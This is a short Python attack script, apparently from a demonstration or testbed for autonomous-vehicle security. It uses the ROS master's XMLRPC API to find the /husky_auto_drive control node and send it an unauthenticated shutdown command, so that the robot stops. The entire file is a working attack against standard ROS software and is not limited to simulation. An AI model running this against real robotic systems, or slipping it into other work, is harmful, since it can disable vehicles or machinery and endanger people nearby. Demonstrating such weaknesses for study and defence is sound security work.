#!/usr/bin/env python3
"""
Node Shutdown Attack
Uses ROS XMLRPC API to remotely shutdown critical nodes
"""

import rospy
import xmlrpc.client
import sys

def node_shutdown_attack():
    """Execute node shutdown attack"""
    try:
        rospy.init_node('shutdown_attacker', anonymous=True)
        
        rospy.loginfo("[ATTACK] Node shutdown attack initiated")
        rospy.loginfo("[ATTACK] Target: /husky_auto_drive node")
        
        # Get ROS master URI
        master = xmlrpc.client.ServerProxy(rospy.get_master().getUri())
        
        # Look up the target node
        code, status_msg, node_uri = master.lookupNode('/shutdown_attacker', '/husky_auto_drive')
        
        if code == 1:
            rospy.loginfo(f"[ATTACK] Found target node at: {node_uri}")
            rospy.loginfo("[ATTACK] Sending shutdown command...")
            
            # Connect to target node and shutdown
            node = xmlrpc.client.ServerProxy(node_uri)
            response = node.shutdown('/shutdown_attacker', 'AVSVA Demonstration Attack')
            
            rospy.loginfo(f"[ATTACK] Shutdown successful! Response: {response}")
            rospy.loginfo("[ATTACK] Target node /husky_auto_drive has been terminated")
            rospy.loginfo("[ATTACK] Robot should stop moving as control node is offline")
            
        else:
            rospy.logerr(f"[ATTACK] Could not find target node: {status_msg}")
            rospy.logerr("[ATTACK] Make sure the simulation is running and husky_auto_drive node is active")
            
    except Exception as e:
        rospy.logerr(f"[ATTACK] Node shutdown attack failed: {str(e)}")

if __name__ == '__main__':
    node_shutdown_attack()
